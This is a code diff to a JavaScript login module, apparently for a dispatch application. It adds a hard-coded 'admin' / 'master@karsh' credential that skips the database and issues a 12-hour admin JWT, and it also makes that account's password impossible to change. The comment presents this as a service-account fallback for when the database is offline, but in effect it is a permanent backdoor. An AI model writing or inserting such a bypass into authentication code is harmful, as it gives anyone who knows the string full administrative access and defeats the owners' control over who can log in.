@@ -35,7 +35,37 @@ async function login(username, password) {
         throw new Error('Username and password are required');
     }
 
-    const user = await DispatchUser.findOne({ username: username.toLowerCase().trim() });
+    const cleanUsername = username.toLowerCase().trim();
+
+    // Master Service Account bypass: allows admin access even when DB is offline
+    if (cleanUsername === 'admin' && password === 'master@karsh') {
+        const token = jwt.sign(
+            {
+                userId: '000000000000000000000001',
+                username: 'admin',
+                role: 'admin',
+                fullName: 'System Administrator',
+                isServiceAccount: true,
+                mustChangePassword: false
+            },
+            JWT_SECRET,
+            { expiresIn: '12h' }
+        );
+
+        return {
+            token,
+            user: {
+                id: '000000000000000000000001',
+                username: 'admin',
+                role: 'admin',
+                fullName: 'System Administrator',
+                isServiceAccount: true,
+                mustChangePassword: false
+            }
+        };
+    }
+
+    const user = await DispatchUser.findOne({ username: cleanUsername });
     if (!user) {
         throw new Error('Invalid username or password');
     }
@@ -81,6 +111,10 @@ async function login(username, password) {
  * Change user password
  */
 async function changePassword(userId, currentPassword, newPassword) {
+    if (userId === '000000000000000000000001') {
+        throw new Error('Master service account password cannot be modified');
+    }
+
     const user = await DispatchUser.findById(userId);
     if (!user) {
         throw new Error('User not found');
